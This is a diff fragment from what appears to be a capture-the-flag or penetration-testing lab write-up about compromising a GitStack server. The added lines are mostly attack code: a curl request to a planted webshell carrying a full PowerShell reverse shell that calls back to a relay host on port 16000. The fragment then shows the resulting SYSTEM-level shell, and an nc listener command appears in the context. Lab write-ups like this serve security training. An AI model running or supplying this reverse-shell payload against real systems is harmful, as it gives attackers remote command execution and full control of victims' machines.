@@ -420,6 +420,11 @@ sudo rlwrap nc -lvnp 4444
 
 Fired the PowerShell reverse shell through the webshell, pointed at prod-serv's relay port since that's the only address git-serv can actually reach:
 
+```
+curl -X POST [http://10.200.180.150/web/exploit-qxvat7r.php](http://10.200.180.150/web/exploit-qxvat7r.php) --data-urlencode "a=powershell.exe -c "$client = New-Object System.Net.Sockets.TCPClient('10.200.180.200',16000);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + 'PS ' + (pwd).Path + '> ';$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()""
+```
+And then boom baby...we in.
+
 ```text
 PS C:\GitStack\gitphp> whoami
 nt authority\system
